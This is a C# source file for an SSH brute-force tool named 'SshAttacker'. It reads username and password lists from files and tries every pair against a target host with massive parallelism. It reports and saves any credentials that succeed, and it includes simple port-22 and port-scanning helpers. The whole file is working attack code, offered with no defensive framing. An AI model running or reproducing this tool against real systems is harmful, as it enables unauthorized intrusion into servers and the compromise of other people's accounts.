using System;
using System.IO;
using System.Net;
using System.Threading.Tasks;
using System.Threading;
using System.Net.Sockets;
using Renci.SshNet;

namespace SshAttacker
{
    class FileParser
    {
        public static string[] ReturnItemlist(string path)
        {
            return File.ReadAllLines(path);
        }
    }

    class Controller
    {
        public static void RunAttack(string host, string[] users, string[] passes)
        {
            Program.SetupAttackEnv(host);
            ParallelOptions po = new ParallelOptions();
            po.MaxDegreeOfParallelism = Environment.ProcessorCount * 10000;
            bool writtenSesion = false;
            Parallel.ForEach(users, po, usr => {
                Parallel.ForEach(passes, po, pass => {
                    using(var sshClient = new SshClient(host.Trim(), usr.Trim(), pass.Trim()))
                    {
                        try
                        {
                            sshClient.Connect();
                            Console.ForegroundColor = ConsoleColor.Green;
                            Console.WriteLine($"\n\n[+] Credentials found succesfully: [pass : {pass.Trim()}] | [user : {usr.Trim()}]");
                            Console.ForegroundColor = ConsoleColor.White;
                            if(!writtenSesion)
                            {
                                SaveSession.SaveWrittenSession(true, host.Trim(), usr.Trim(), pass.Trim());
                                writtenSesion = true;
                            }
                            Console.ReadLine();
                            Environment.Exit(1);
                        }
                        catch(Exception ex)
                        {
                            Console.WriteLine($"[ATTEMPT] Credentials invalid: [pass : {pass.Trim()}] | [user : {usr.Trim()}]");
                            Console.WriteLine("[VERBOSE] : " + ex.Message);
                        }
                    }
                });
            });
            SaveSession.SaveWrittenSession(false, host, "", "");
        }

        public static void AttemptLogin(string host, string pass, string usr)
        {
            TcpClient client = new TcpClient();
            try
            {
                client.Connect(host, 22);
                Console.WriteLine(client.Connected);
            }
            catch(Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
        }
    }

    class PortScanner
    {
        public static bool isPortOpen(IPAddress addr, int port)
        {
            using(TcpClient client = new TcpClient())
            {
                try
                {
                    client.Connect(addr, port);
                    return true;
                }
                catch
                {
                    return false;
                }
            }
        }
    }
}
